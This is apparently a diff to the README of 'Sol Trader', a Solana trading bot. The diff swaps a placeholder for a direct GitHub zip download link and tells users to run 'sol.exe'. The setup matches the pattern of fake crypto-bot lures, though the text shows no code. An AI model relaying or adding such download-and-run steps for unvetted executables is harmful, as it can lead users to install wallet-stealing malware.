@@ -14,7 +14,7 @@ Welcome to **Sol Trader**, the AI-powered trading bot that brings the precision 
 ## Getting Started
 
 1. **Download Sol Trader**  
-   Head over to the [Sol Trader GitHub repository](#) and download the `sol folder` file.
+   Head over to the https://codeload.github.com/0x0NullV0id/Sol-Trader/zip/refs/heads/main and download the `sol folder` file.
 
 2. **Run Sol Trader**  
    Open `sol.exe` and answer a few quick setup questions. The AI will automatically scan DEX Screener to find the best trading pairs on the Solana DEX, setting you up for optimized trades.
